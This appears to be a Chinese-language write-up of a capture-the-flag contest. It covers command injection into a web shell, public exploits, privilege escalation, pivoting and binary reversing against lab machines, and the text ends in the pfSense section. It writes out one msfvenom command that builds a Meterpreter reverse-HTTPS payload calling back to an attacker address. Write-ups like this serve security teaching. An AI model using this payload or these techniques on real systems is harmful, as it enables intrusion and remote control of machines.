**
**iLibrarian**
当浏览到172.30.1.236 Web服务器时，我们发现iLibrarian应用程序托管在同名的目录中。
关于这个网站，需要关注的两点是，我们在一个下拉菜单中有一个用户名列表，页面底部是一个版本号。此外，我们还能创建一个用户帐户。
当测试应用程序时，我们执行的前几个步骤是尝试查找默认凭据，版本号，然后如果可能，获取源/二进制文件。 这里的目的是尽可能地作为白盒子进行测试。
关于项目最近变动的一个很好的信息来源是GitHub上的问题选项卡。 有时，安全问题将被列出。 如下图所示，在iLibrarian
GitHub网站上列出的第一个问题是“RTF Scan Broken”。这看起来非常有趣，让我们来深入挖掘一下吧。
有一个RTF转换错误，显然，关于该错误的信息非常少。
我们看看具体的变化，以下代码看起来很有趣。
下一步是查看文件更改的历史记录。
列出的第一个更改是变量错误，这不是一个安全问题。 第二个变化看起来很有希望。
对shell参数进行转义，以确保用户提供的数据不能转换为系统命令，从而通过操作系统执行某些用户操作。通常的转义方法，是使用换行符、分号、单引号等。这种类型的漏洞是众所周知的，被称为命令注入。
在PHP（用于编写iLibrarian的语言）中，缓解措施通常是调用escapeshellarg（）来封装用户提供的数据。
看看“escape shell
arguments”方面的变化，我们可以发现，这里的变化是，使用针对传递给[exec（）](http://php.net/manual/en/function.exec.php)函数的两个参数调用escapeshellargs（）。
查看在进行此次更改之前版本，我们看到以下关键行。
首先创建一个名为$
temp_file的变量。这个变量被设置为当前临时路径加上filename的值，它是在上传manuscript文件期间传递的（manuscript是表单变量的名称）进行传递的。
然后从$ temp_file变量获取文件扩展名，如果它是doc，docx或odt，则文件将被转换。
注入发生在第三个高亮显示的代码中。通过提供经用转义字符间隔的命令值，我们就能完成命令注入。
太棒了。接下来我们打算尝试上传Web shell。为此，我们构建和上传了以下payload。
这样，我们就创建了一个页面，该页面将执行cmd参数中传递的任何值。应该注意的是，在渗透测试利用这样的问题时，不应该使用可预测的名称，例如test4.php，以免被别人定位和滥用（我们通常会生成多个GUID名称），理想情况下，应该提供一些内置的功能来限制IP地址。然而，这是一个CTF，时间是最宝贵的。但愿其他团队不会找到我们新创建的页面，因为它的名称太显眼了！
该文件被写入后，我们调用test4.php，查看它是以什么身份来运行。
正如预期的那样，我们是作为web用户运行的，所以只有有限的权限。不过，这足以搞定一些旗帜。我们决定使用完全交互式shell来升级我们对操作系统的访问权限——这个交互式shell也是使用相同的攻击向量得到的。
最后，我们设法进行提取。这里的操作系统是Ubuntu 15.04，利用Dirty Cow漏洞后，我们获取了超级用户权限，并拿下了这台机器上的最后一个旗标。
**  
**
**Webmin**
这台机器开放了TCP端口80和10000。 80端口运行一个Web服务器，托管了一些可下载的挑战，而端口10000似乎是Webmin。
Webmin是一个引人入胜的目标，因为这个版本好像有一些已经公开的安全漏洞。 但是，我们尝试了一些漏洞代码之后，发现没有效果。
但是，端口80上的Web服务器却因其服务器banner而泄露操作系统；正是北韩的RedStar
3.0。啊哈——不久以前@hackerfantastic对RedStar进行了大量的研究，如果没记错的话，研究结果表明这个操作系统的安全性并不太好。果然…
https://www.exploit-db.com/exploits/40938/
对exploit进行一番调查，并简单地设置一个netcat侦听器后，使用适当的参数来运行exploit，看，立马就得到了一个root
shell。旗标顺利到手；当然由于来得太容易，分值肯定不会太高。不过这里我们还是要感谢@hackerfantastic！
**Dup Scout**
这台机器运行了一个名为Dup Scout Enterprise的应用程序。
它容易受到远程代码执行漏洞的攻击，在exploit-db上很容易找到相应的exploit。
我们通过使用admin：admin登录并查看系统信息页面，发现体系结构为32位。为了在这台机器上面使用该exploit，唯一要做的事情就是修改这个shellcode，使其适用于32位操作系统。
这可以通过msfvenom轻松实现：
    msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.70.242 LPORT=443 EXITFUN=none -e x86/alpha_mixed -f python
在目标服务器上运行exploit之前，我们要在本地搭设相应的软件，以检查它是否完全按预期工作。然后，我们才在生产服务器上面运行，并获得了具有SYSTEM级访问权限的shell。效果不错，也很轻松。
**X86-intermediate.binary**
接下来我们将借助调试器（也即IDA），完成两项二进制挑战。
通过浏览172.30.1.240 Web服务器，我们发现下图所示的目录中包含7个不同二进制文件。下面我们要做的事情就是搞定中间的x86二进制文件。
通过在IDA中打开它并直接转到主函数：
粗略地说，这实际上就是把问题转换为检查传递给可执行文件的第一个参数是否为-p。如果是，则下一个参数存储为第一个密码。然后将其传递给CheckPassword1（不是实际名称，它在IDA中已被重命名）。如果这是正确的，用户被提示输入第二个密码，由CheckPassword2检查。如果第二个密码正确，则会向用户显示“Password
2: good job, you’re done” 的消息。希望这次也能获得旗标！
通过打开CheckPassword1函数，我们立即看到它正在建立一个字符数组。
然后，将指向该数组开头的指针连同该函数的唯一参数一起传递给_strcmp，该参数是以-p传递的密码。
我们检查了存入char数组的值，它们看起来像小写的ASCII字符。 解码后，发现其值为__pass。
将该值传递给具有-p标志的二进制文件，我们得到以下内容：
好，下面我们开始寻找第二个密码。 直接跳到CheckPassword2函数，我们在函数的开头发现如下内容。这次会与之前那个函数的情况完全一样吗？
不，这次是完全不同的，看看函数主体部分的屏幕截图你就会明白了。它看起来比之前那个函数要复杂一点…
利用托管于[https://godbolt.org/的一款优秀编译工具，大致可以将上面的代码转换为以下内容：](https://godbolt.org/%E7%9A%84%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%A4%A7%E8%87%B4%E5%8F%AF%E4%BB%A5%E5%B0%86%E4%B8%8A%E9%9D%A2%E7%9A%84%E4%BB%A3%E7%A0%81%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%EF%BC%9A)
这个解决方案的方法是将这个代码调整成C＃，这次运行每个可能的字符组合，然后检查生成的值是否匹配存储的哈希值。
运行它，我们发现了- @ 12345！），然后将其传递给exe来进行验证。
为了获得旗标，只需要组合成the_pass @ 12345！）即可，提交后，我们得到了500点。
**  
**
**arm-hard.binary**
文件arm-hard.binary包含一个ELF可执行文件，它通过向R0寄存器写入连续的字符来标出一个旗标。它使用类似于ROP的方法，将函数地址列表压到堆栈上，然后当每个函数返回时，它就会从列表中调用下一个函数。
在shellcode中，ROP是一种常用的技术。它是一种基于堆栈的缓冲区溢出攻击方法，即使包含堆栈的内存被标记为不可执行，也能够攻击得手。被执行的代码片段（称为“gadgets”）通常是从其他可用的代码段中挑选出来的。在本例中，不需要这样做，因为二进制文件已经被编写成包含所需的代码片段，而ROP只是用来混淆控制流。
为了进一步混淆该行为，通过向值0x61（ASCII a）添加偏移量来形成每个字符。这是利用寄存器R1中的基值（0x5a + 0x07 = 0x61）完成的：
例如，这里是将字母n写入R0的gadget（0x61 + 0x0d = 0x6e）：
这里是大写字母B的相关gadget：
寄存器R10中保存的基地址等于第一个gadget（0x853c）的地址，gadget地址作为偏移量。例如：
这里通过第一条指令放置在R11中的地址等于0x853c + 0x30 =
0x856c，我们上面看到的是写入字母n的gadget。第二个指令将其压到堆栈上。通过将这些操作序列串在一起，可以拼出一条消息：
上述gadget分别对应于字母n，o，c，y，b，r，e和d。由于返回栈按照先入先出的原则进行操作，所以它们以相反的顺序执行，因此可以拼出单词derbycon（旗标的一部分）。为了启动这个进程，程序可以弹出第一个gadget的地址，然后返回给它：
通过分析压到堆栈的所有gadget地址，最后找到了完整旗标，其实是一个电子邮件地址形式：
n PI:EMAIL
**NUKELAUNCH & NUKELAUNCHDB**
我们注意到服务器正在运行IIS
6并启用了WebDav。经验告诉我们，这种组合意味着它很可能会含有CVE-2017-7269漏洞。幸运的是，Metasploit框架中包含公开的漏洞利用代码：
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/iis/iis_webdav_scstoragepathfromurl.rb
正如所料，该exploit确实管用，我们从该服务器收集到一些旗标。
我们收集了所有明显的旗标后，我们开始更加详细地查看服务器。我们运行了一个简单的net
view命令，并发现受感染的服务器NUKELANUCH可以看到一个名为NUKELAUNCHDB的服务器。
我们利用笔记本电脑进行快速端口扫描，发现这台服务器确实存在，但没有开放端口。因此，我们需要设法找到这台服务器的具体访问方式。根据我们的推测，可能存在一些网络隔离，所以我们使用原来的服务器作为转发流量的枢纽点。
实际上，1433号端口在NUKELAUNCHDB上面是开放的，只是要通过NUKELAUNCH路由。
我们利用Metasploit内置的pivoting功能，通过NUKELAUNCH将流量推送到NUKELAUNCHDB。为此，只需简单地添加一条路由，类似于route
add NUKELAUNCHDB 255.255.255.255
10，其中10是我们希望路由的会话号。然后我们启动了Metasploit的socks代理服务器。这样，我们就可以利用其他工具，并通过代理链将其流量推送到NUKELAUNCHDB了。
在这个阶段，我们对sa帐户的密码进行了一些有根据的猜测，并使用基于CLR的自定义存储过程（http://sekirkity.com/command-execution-in-sql-server-via-fileless-clr-based -custom-stored-procedure
/）获得了针对NUKELAUNCHDB上的底层操作系统的访问权限。
**ACMEWEAPONSCO**
根据HTTP响应的头部来看，我们发现这个主机运行的是一个易受攻击的Home Web Server版本。
经研究发现以下exploit-db页面：
https://www.exploit-db.com/exploits/42128/
它详细介绍了路径遍历攻击，可以用于在受影响的机器上执行二进制文件。最初，我们想利用这个漏洞来运行编码的PowerShell命令，但是没有得手，所以我们开始寻找其他利用方式。
这个Web应用程序好像提供了文件上传功能，但功能不是很完善。
然而，根据页面上有一个说明，发现FTP仍然可以用于上传文件，所以这就是我们的下一站。
匿名FTP访问已启用，因此我们可以直接登录并上传可执行文件。眼下，我们可以将文件上传到目标系统并运行二进制文件。但是，我们不知道我们上传的二进制文件的完整路径。幸运的是，cgi-bin中有一个文本文件，详细介绍了相关的配置：
接下来，我们要做的就是运行我们上传的二进制文件。以下Web请求可以完成这项工作，从而获取系统的访问权限。
旗标分散在文件系统和MSSQL数据库中。其中一个旗标是在用户桌面上找到的，但是需要特定的图形格式才能访问，因此我们启用了RDP来抓取它。
**  
**
**pfSense**
这个挑战是基于Scott Brit（@ s4squatch）在DerbyCon
2017之前不久发现的一个漏洞。这不是一个0day（Scott已经报告给了pfSense，而且在补丁说明中已经隐约提及了这个漏洞的情况），但是我们对它的了解非常有限。
这台机器只给我们开放了一个443 TCP端口，提供一个启用HTTPS服务的网站。访问该网站后，在登录页面发现了开源防火墙软件pfSense。